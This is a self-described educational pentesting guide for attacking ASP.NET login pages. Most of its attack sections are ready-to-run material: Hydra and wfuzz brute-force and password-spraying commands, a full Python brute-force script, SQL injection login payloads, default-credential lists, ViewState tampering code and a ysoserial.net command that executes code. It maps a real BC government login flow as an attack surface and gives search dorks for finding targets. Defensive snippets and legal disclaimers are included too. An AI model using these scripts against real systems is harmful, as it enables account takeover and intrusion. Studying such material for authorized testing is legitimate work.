# Self-Serve Hacking Guide

> **Educational pentesting guide for authorized testing only**
> White hat methodology. Legal practice. Own systems or explicit permission.

---

## Table of Contents

1. [ASP.NET Login Brute Force Guide](#aspnet-login-brute-force-guide)
2. [Common Attack Vectors](#common-attack-vectors)
3. [Tools & Commands](#tools--commands)
4. [Defensive Measures](#defensive-measures)
5. [Legal Practice Platforms](#legal-practice-platforms)

---

# ASP.NET Login Brute Force Guide

## Understanding ASP.NET Authentication (Legacy)

### Old ASP.NET Forms Auth (Pre-2010)

**Characteristics:**
- Forms-based authentication via cookies
- `ASP.NET_SessionId` cookie for session tracking
- `.ASPXAUTH` cookie for persistent authentication
- Often uses `ViewState` (hidden field) for state management
- Usually POST requests to `/login.aspx` or similar
- May have `SMSESSION` parameter (SiteMinder integration)

**Example Login Form:**
```html
<form method="post" action="/login.aspx">
  <input name="__VIEWSTATE" value="..." />
  <input name="username" type="text" />
  <input name="password" type="password" />
  <input name="btnSubmit" type="submit" value="Login" />
</form>
```

### Modern ASP.NET (Post-2016)

**Characteristics:**
- ASP.NET Core Identity
- JWT tokens or Identity cookies
- Better rate limiting by default
- CSRF protection (anti-forgery tokens)
- MFA support built-in

---

## Recon Phase: Understanding the Target

### Step 1: Identify ASP.NET Version

**Check HTTP Headers:**
```bash
curl -I https://target.com/login.aspx

# Look for:
# X-AspNet-Version: 4.0.30319
# X-Powered-By: ASP.NET
# Server: Microsoft-IIS/8.5
```

**Check for ViewState:**
```bash
curl https://target.com/login.aspx | grep -i viewstate

# Old ASP.NET will have:
# <input type="hidden" name="__VIEWSTATE" value="..." />
```

**Burp Suite Analysis:**
1. Intercept login request
2. Look for POST parameters: `__VIEWSTATE`, `__EVENTVALIDATION`
3. Check cookies: `ASP.NET_SessionId`, `.ASPXAUTH`
4. Note form field names (username, password, etc.)

### Step 2: Test for Rate Limiting

**Manual Test (5 attempts):**
```bash
for i in {1..5}; do
  curl -X POST https://target.com/login.aspx \
    -d "username=admin&password=wrongpass$i" \
    -v
  echo "Attempt $i"
done
```

**What to look for:**
- ✅ No rate limiting: All 5 attempts get same response
- ⚠️ Soft rate limiting: Slower responses after 3-5 attempts
- ❌ Hard rate limiting: HTTP 429 or lockout after N attempts
- ❌ IP block: Connection refused after threshold

### Step 3: Identify Session Behavior

**Test Session Persistence:**
```bash
# Login successfully
curl -X POST https://target.com/login.aspx \
  -d "username=validuser&password=validpass" \
  -c cookies.txt

# Check if session persists
curl https://target.com/dashboard.aspx -b cookies.txt
```

**Common Issues:**
- Session expires immediately (BC gov bug example)
- Session requires `SMSESSION` parameter
- Cookies not marked `httpOnly` (XSS vulnerability)
- Cookies sent over HTTP (insecure)

---

## Attack Phase: Brute Force Techniques

### Method 1: Hydra (Password Spraying)

**What is Password Spraying?**
- Try one password across many usernames
- Avoids account lockout (one attempt per account)
- Common passwords: `Password123`, `Winter2024`, `CompanyName2024`

**Command:**
```bash
hydra -L users.txt -p Winter2024 \
  https-post-form \
  "target.com/login.aspx:username=^USER^&password=^PASS^&btnSubmit=Login:F=Invalid" \
  -t 4 -w 30

# -L users.txt       = List of usernames
# -p Winter2024      = Single password to spray
# -t 4               = 4 parallel threads (slow = stealthy)
# -w 30              = Wait 30s between attempts
# F=Invalid          = Failure string (what appears when login fails)
```

**Generate User List:**
```bash
# Common patterns:
admin
administrator
sysadmin
root
test
# Company-specific:
firstname.lastname
flastname
first.last
```

### Method 2: Burp Suite Intruder

**Setup:**
1. Capture login request in Burp Proxy
2. Send to Intruder (Ctrl+I)
3. Set attack type: **Cluster Bomb** (username + password)
4. Mark positions: `username=§value§&password=§value§`
5. Load payloads:
   - Payload Set 1: Usernames
   - Payload Set 2: Passwords
6. Configure throttling: 500ms delay between requests

**Detecting Success:**
- Response length different from failures
- HTTP 302 redirect (successful login)
- Cookie set: `.ASPXAUTH` present
- Response contains: "Welcome, username"

### Method 3: Custom Python Script (Full Control)

**Why Custom Script?**
- Handle ViewState extraction automatically
- Respect rate limits with smart delays
- Log every attempt for reporting
- Handle ASP.NET session quirks

**Example Script:**
```python
import requests
from bs4 import BeautifulSoup
import time

TARGET = "https://target.com/login.aspx"
USERS = ["admin", "test", "user1"]
PASSWORDS = ["Password123", "Winter2024", "Admin@123"]

def extract_viewstate(session, url):
    """Get ViewState and EventValidation from login page"""
    resp = session.get(url)
    soup = BeautifulSoup(resp.text, 'html.parser')

    viewstate = soup.find('input', {'name': '__VIEWSTATE'})
    eventvalidation = soup.find('input', {'name': '__EVENTVALIDATION'})

    return {
        '__VIEWSTATE': viewstate['value'] if viewstate else '',
        '__EVENTVALIDATION': eventvalidation['value'] if eventvalidation else ''
    }

def attempt_login(session, username, password):
    """Attempt single login"""
    # Get fresh ViewState for each attempt
    fields = extract_viewstate(session, TARGET)

    # Build POST data
    data = {
        'username': username,
        'password': password,
        'btnSubmit': 'Login',
        **fields  # Include ViewState + EventValidation
    }

    # Submit login
    resp = session.post(TARGET, data=data, allow_redirects=False)

    # Check for success indicators
    if resp.status_code == 302:  # Redirect = success
        return True
    if '.ASPXAUTH' in resp.cookies:  # Auth cookie set
        return True
    if 'Invalid' not in resp.text:  # No error message
        return True

    return False

def brute_force():
    """Main brute force loop"""
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })

    for username in USERS:
        for password in PASSWORDS:
            print(f"[*] Trying {username}:{password}")

            success = attempt_login(session, username, password)

            if success:
                print(f"[+] SUCCESS! {username}:{password}")
                return
            else:
                print(f"[-] Failed")

            # Rate limit: 5 seconds between attempts
            time.sleep(5)

    print("[!] No valid credentials found")

if __name__ == "__main__":
    brute_force()
```

**Run it:**
```bash
python3 brute_force.py
```

### Method 4: WFuzz (Web Fuzzer)

**Basic Password Attack:**
```bash
wfuzz -w passwords.txt \
  -d "username=admin&password=FUZZ&btnSubmit=Login" \
  --hc 200 \
  -t 5 \
  https://target.com/login.aspx

# -w passwords.txt   = Wordlist
# -d "..."            = POST data (FUZZ = placeholder)
# --hc 200            = Hide HTTP 200 responses (failures)
# -t 5                = 5 threads
```

**Username Enumeration:**
```bash
wfuzz -w users.txt \
  -d "username=FUZZ&password=test" \
  --sc 200 \
  https://target.com/login.aspx

# Look for different response lengths:
# Valid user: "Invalid password" (response length: 1543)
# Invalid user: "User not found" (response length: 1521)
```

---

## Common Attack Vectors

### 1. SQL Injection in Login Form

**Test for SQLi:**
```bash
# Try these in username/password fields:
admin' OR '1'='1
admin' OR 1=1--
admin' OR 1=1#
' OR '1'='1' --
admin'--

# If login succeeds = SQL injection vulnerability
```

**Automated SQLi Testing:**
```bash
sqlmap -u "https://target.com/login.aspx" \
  --data="username=admin&password=test" \
  --level=5 --risk=3 \
  --batch

# --level=5   = Test everything
# --risk=3    = Aggressive (may cause issues)
# --batch     = Don't ask questions
```

### 2. Default Credentials

**Common ASP.NET Defaults:**
```
admin:admin
administrator:password
admin:password123
admin:Admin@123
sa:sa (SQL Server)
root:root
test:test
demo:demo
```

**Check Vendor Defaults:**
- IIS: `IUSR_MACHINENAME`
- SiteMinder: `siteminder:siteminder`
- SharePoint: `sp_admin:password`

### 3. Session Fixation

**Attack Flow:**
1. Attacker gets session cookie: `ASP.NET_SessionId=ABC123`
2. Victim logs in using that session ID
3. Attacker uses same session ID to access victim's account

**Test:**
```bash
# Get session cookie without logging in
curl https://target.com/login.aspx -c cookies.txt

# Check if session ID changes after login
curl -X POST https://target.com/login.aspx \
  -b cookies.txt -c cookies2.txt \
  -d "username=valid&password=valid"

# Compare cookies.txt vs cookies2.txt
# If ASP.NET_SessionId is SAME = vulnerable
```

### 4. Viewstate Manipulation

**What is ViewState?**
- Hidden field that stores page state
- Base64 encoded, optionally encrypted
- If not encrypted, can be modified

**Decode ViewState:**
```bash
# Install viewstate decoder
pip3 install viewstate

# Decode ViewState value
python3 -c "
from viewstate import ViewState
vs = ViewState('dDwtMTY4...')  # Paste ViewState value
print(vs)
"
```

**Attack:**
```python
# If ViewState is not encrypted, modify it:
from viewstate import ViewState

vs = ViewState()
vs['IsAdmin'] = True  # Try to escalate privileges
vs['UserId'] = 1      # Try to impersonate user
print(vs.encode())    # Get modified ViewState

# Submit in login request
```

### 5. Response Timing Attack

**Username Enumeration via Timing:**
```bash
# Valid users take longer (password hash check)
# Invalid users return fast (no DB lookup)

time curl -X POST https://target.com/login.aspx \
  -d "username=admin&password=test"
# Real time: 0m0.523s

time curl -X POST https://target.com/login.aspx \
  -d "username=fakeuserXYZ&password=test"
# Real time: 0m0.102s

# 0.5s vs 0.1s = username "admin" exists
```

---

## Tools & Commands

### Essential Tools

**1. Burp Suite (Web Proxy)**
```bash
# Community Edition (free)
java -jar burpsuite.jar

# Configure browser proxy: 127.0.0.1:8080
# Intercept login requests
# Analyze cookies, headers, POST data
```

**2. Hydra (Brute Force)**
```bash
# Install
sudo apt install hydra

# HTTP POST form attack
hydra -l admin -P rockyou.txt \
  target.com https-post-form \
  "/login.aspx:username=^USER^&password=^PASS^:F=Invalid"
```

**3. SQLMap (SQL Injection)**
```bash
# Install
sudo apt install sqlmap

# Test login form
sqlmap -u "https://target.com/login.aspx" \
  --data="username=admin&password=test" \
  --dbs  # Enumerate databases
```

**4. Nikto (Web Scanner)**
```bash
# Install
sudo apt install nikto

# Scan for vulnerabilities
nikto -h https://target.com
```

**5. Dirb/Gobuster (Directory Enumeration)**
```bash
# Find hidden pages/endpoints
gobuster dir -u https://target.com \
  -w /usr/share/wordlists/dirb/common.txt

# Look for:
# /admin
# /login.aspx
# /debug.aspx
# /web.config.bak
```

### Wordlists

**Password Lists:**
```bash
# RockYou (14M passwords)
/usr/share/wordlists/rockyou.txt

# SecLists (comprehensive)
git clone https://github.com/danielmiessler/SecLists
cd SecLists/Passwords

# Common passwords
Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
```

**Username Lists:**
```bash
# SecLists usernames
SecLists/Usernames/top-usernames-shortlist.txt
SecLists/Usernames/Names/names.txt
```

**Generate Custom Wordlist:**
```bash
# Based on company name "AcmeCorp"
cewl https://acmecorp.com -w wordlist.txt

# Adds: AcmeCorp, Acme, Corp, product names, etc.
```

### Network Analysis

**Monitor Traffic (Wireshark):**
```bash
# Capture HTTP traffic
sudo wireshark

# Filter: http.request.method == "POST"
# Look for plain-text passwords (HTTP not HTTPS)
```

**Replay Attack (Curl):**
```bash
# Capture request in Burp, copy as curl:
curl 'https://target.com/login.aspx' \
  -H 'Cookie: ASP.NET_SessionId=abc123' \
  -H 'User-Agent: Mozilla/5.0' \
  --data-raw 'username=admin&password=test&__VIEWSTATE=...'
```

---

## Defensive Measures (Blue Team)

### How to Prevent These Attacks

**1. Rate Limiting**
```csharp
// ASP.NET Core - Rate limiting middleware
public void ConfigureServices(IServiceCollection services)
{
    services.AddRateLimiter(options =>
    {
        options.GlobalLimiter = PartitionedRateLimiter.Create<HttpContext, string>(context =>
            RateLimitPartition.GetFixedWindowLimiter(
                partitionKey: context.Connection.RemoteIpAddress?.ToString() ?? "unknown",
                factory: partition => new FixedWindowRateLimiterOptions
                {
                    PermitLimit = 5,      // 5 attempts
                    Window = TimeSpan.FromMinutes(1)  // per minute
                }));
    });
}
```

**2. Account Lockout**
```csharp
// Lock account after 5 failed attempts
if (failedAttempts >= 5)
{
    user.LockoutEnd = DateTimeOffset.UtcNow.AddMinutes(15);
    await _userManager.UpdateAsync(user);
}
```

**3. CAPTCHA**
```html
<!-- Google reCAPTCHA v3 -->
<script src="https://www.google.com/recaptcha/api.js"></script>
<div class="g-recaptcha" data-sitekey="your-site-key"></div>
```

**4. Multi-Factor Authentication (MFA)**
```csharp
// ASP.NET Identity - Enable MFA
await _userManager.SetTwoFactorEnabledAsync(user, true);
```

**5. Strong Password Policy**
```csharp
services.Configure<IdentityOptions>(options =>
{
    options.Password.RequiredLength = 12;
    options.Password.RequireDigit = true;
    options.Password.RequireUppercase = true;
    options.Password.RequireNonAlphanumeric = true;
});
```

**6. Logging & Monitoring**
```csharp
// Log failed login attempts
_logger.LogWarning($"Failed login attempt for user {username} from IP {ipAddress}");

// Alert on 10+ failures from same IP
if (failedAttemptsFromIP >= 10)
{
    SendSecurityAlert($"Possible brute force from {ipAddress}");
}
```

---

## Legal Practice Platforms

### Where to Practice (Legally)

**1. TryHackMe**
- URL: https://tryhackme.com
- Cost: Free tier available, Premium $10/mo
- Beginner-friendly guided labs
- "Web Fundamentals" path has login brute force challenges

**2. HackTheBox**
- URL: https://hackthebox.com
- Cost: Free tier, VIP $14/mo
- Realistic vulnerable machines
- "Starting Point" has easy web challenges

**3. PortSwigger Web Security Academy**
- URL: https://portswigger.net/web-security
- Cost: 100% Free
- Labs for SQL injection, auth bypass, session attacks
- Created by Burp Suite developers

**4. DVWA (Damn Vulnerable Web App)**
```bash
# Run locally in Docker
docker run --rm -it -p 80:80 vulnerables/web-dvwa

# Access: http://localhost
# Default creds: admin:password
# Practice brute force at Security Level: Low
```

**5. WebGoat**
```bash
# OWASP training app
docker run -p 8080:8080 webgoat/webgoat

# Lessons on authentication bypass, SQL injection
```

### Your Own Lab Setup

**Create Vulnerable ASP.NET App:**
```bash
# Intentionally insecure login for practice
dotnet new webapp -n VulnerableApp
cd VulnerableApp

# Remove rate limiting, add simple auth
# Deploy locally, test attacks against it
```

---

## ASP.NET Specific Breadcrumbs

### File Locations (Information Disclosure)

**web.config (Configuration File):**
```bash
# Often exposed due to misconfiguration
curl https://target.com/web.config
curl https://target.com/Web.config.bak

# Contains:
# - Database connection strings (sometimes with passwords!)
# - App settings
# - Session configuration
```

**App_Data (Database Files):**
```bash
# Sometimes accessible
curl https://target.com/App_Data/database.mdf

# SQL Server database files
```

### Session Cookies Deep Dive

**ASP.NET_SessionId:**
- Server-side session identifier
- Usually: 24 characters, alphanumeric
- Example: `ASP.NET_SessionId=abc123xyz456`
- Should be regenerated after login (prevent session fixation)

**.ASPXAUTH:**
- Forms authentication ticket
- Encrypted cookie
- Contains: username, expiration, custom data
- If you can decrypt this, you can forge authentication

**Decrypting .ASPXAUTH (if machine key is known):**
```csharp
// Requires machine key from web.config
// If exposed: https://target.com/web.config
<machineKey validationKey="..." decryptionKey="..." />

// Tool: AspDotNetWrapper
// https://github.com/NotSoSecure/AspDotNetWrapper
```

### ViewState Exploitation

**Check if ViewState is Encrypted:**
```bash
# If ViewState starts with /w, it's not encrypted
__VIEWSTATE=/wEPDwUKLT...  # Vulnerable

# If encrypted, starts differently:
__VIEWSTATE=xyz123...       # Encrypted (safer)
```

**YSoSerial.Net (Deserialization Exploits):**
```bash
# If ViewState MAC validation is disabled
git clone https://github.com/pwntester/ysoserial.net
cd ysoserial.net

# Generate malicious ViewState
./ysoserial.exe -p ViewState \
  -g TextFormattingRunProperties \
  -c "powershell.exe -c whoami"

# If MAC validation disabled, can execute code
```

---

## Real-World Example: BC Gov Site

### What We Learned

**Login Flow:**
```
1. GET https://myselfserve.gov.bc.ca
2. Click "Sign In" → Redirect to BCeID:
   https://logon7.gov.bc.ca/clp-cgi/capBceid/logon.cgi
3. POST credentials:
   username=USER&password=PASS&btnSubmit=Login
4. Redirect back to:
   https://myselfserve.gov.bc.ca/Auth/Login
5. Set cookies:
   - ASP.NET_SessionId
   - SMSESSION (SiteMinder)
```

**Session Bug Discovery:**
```
1. Login succeeds (cookies set)
2. Navigate to /Auth → Session expires immediately
3. Network analysis shows:
   GET /Auth/SessionTimeout
   GET /Auth/Signout
4. Cookie cleared: ASP.NET_SessionId=; path=/
5. All requests get ?SMSESSION=NO parameter
```

**Root Cause:**
- Legacy SiteMinder integration (18+ years old)
- Session timeout bug in ASP.NET/SiteMinder handoff
- Not our code, can't fix

**Workaround:**
- Re-login before each scrape
- 20-second delays to avoid rate limits
- Accept the inefficiency

### Attack Surface Analysis

**What We Could Do (If Authorized):**
1. Test for SQL injection in BCeID login
2. Check for default SiteMinder credentials
3. Brute force user accounts (if no rate limiting)
4. Session fixation attack (session IDs don't regenerate)
5. Test ViewState manipulation

**What We WON'T Do (Illegal):**
- We only test OUR OWN dashboard
- BC gov site is OFF LIMITS without authorization
- Educational analysis only

---

## Methodology Cheat Sheet

### Pentesting an ASP.NET Login (Step-by-Step)

**Phase 1: Reconnaissance**
```bash
# 1. Identify ASP.NET version
curl -I https://target.com/login.aspx | grep -i "x-aspnet"

# 2. Check for ViewState
curl https://target.com/login.aspx | grep -i viewstate

# 3. Map the login flow
# - Intercept in Burp Suite
# - Note all POST parameters
# - Check cookies set after login
```

**Phase 2: Vulnerability Assessment**
```bash
# 1. Test for SQL injection
sqlmap -u "https://target.com/login.aspx" \
  --data="username=admin&password=test"

# 2. Check for default credentials
hydra -C /usr/share/wordlists/default-credentials.txt \
  https-post-form "target.com/login.aspx:..."

# 3. Test for username enumeration
# - Different error messages for valid/invalid users?
# - Different response times?
```

**Phase 3: Exploitation (If Authorized)**
```bash
# 1. Brute force with rate limiting
hydra -l admin -P rockyou.txt \
  -t 1 -w 5 \  # 1 thread, 5s delay
  https-post-form "target.com/login.aspx:..."

# 2. Session attacks
# - Test session fixation
# - Check if session IDs regenerate after login
# - Test if cookies are httpOnly and secure
```

**Phase 4: Reporting**
```
1. Document all findings
2. Proof of concept (screenshots/videos)
3. Risk rating (CVSS score)
4. Remediation steps
5. Timeline for fix
```

---

## Quick Reference Commands

**Scan for ASP.NET Sites:**
```bash
# Shodan query
shodan search "X-AspNet-Version"

# Google dork
inurl:login.aspx intitle:"login"
```

**Test Login Speed (Rate Limit Check):**
```bash
time for i in {1..10}; do
  curl -X POST https://target.com/login.aspx \
    -d "username=admin&password=test$i" \
    -o /dev/null -s
done
```

**Extract ViewState:**
```bash
curl -s https://target.com/login.aspx | \
  grep -oP '__VIEWSTATE" value="\K[^"]+' | \
  base64 -d | xxd
```

**Monitor for Failed Logins (Defensive):**
```bash
# Windows Event Log
Get-EventLog -LogName Security -InstanceId 4625 |
  Where-Object {$_.TimeGenerated -gt (Get-Date).AddHours(-1)}

# IIS Logs
Select-String -Path "C:\inetpub\logs\LogFiles\*" \
  -Pattern "401" |
  Group-Object {$_.Line.Split(' ')[8]} |
  Sort-Object Count -Descending
```

---

## Key Takeaways

1. **Always get authorization** before testing any system
2. **Rate limiting** is your enemy (attacker) and friend (defender)
3. **ASP.NET ViewState** can be a goldmine for exploitation
4. **Default credentials** still work surprisingly often
5. **SQL injection** in login forms is still common in legacy apps
6. **Session management** bugs are everywhere (BC gov example)
7. **MFA** stops 99% of brute force attacks
8. **Practice legally** on TryHackMe, HackTheBox, your own labs

---

## Next Steps

**For Learning:**
1. Set up DVWA locally, practice brute forcing at Security Level: Low
2. Try TryHackMe "Authentication Bypass" room
3. Read OWASP Testing Guide chapter on Authentication

**For Practice:**
1. Build your own vulnerable ASP.NET app
2. Test it with Hydra, Burp Suite, custom scripts
3. Write a report on your findings

**For Career:**
1. Get CompTIA Security+ or eJPT certification
2. Join a bug bounty platform (HackerOne, Bugcrowd)
3. Network with security community (#infosec on Twitter)

---

## Legal Disclaimer

This guide is for **educational purposes only**. All techniques described should only be used on:
- Systems you own
- Systems with explicit written authorization
- Legal practice platforms (TryHackMe, HackTheBox, etc.)

**Unauthorized access is illegal** (Computer Fraud and Abuse Act, 18 U.S.C. § 1030). Penalties include up to 10 years imprisonment and $250,000 fines.

**Authorization = Legal. No authorization = Illegal. Always get permission.**

---

**Version:** 1.0
**Last Updated:** 2026-01-18
**Author:** nulljosh (for educational purposes)
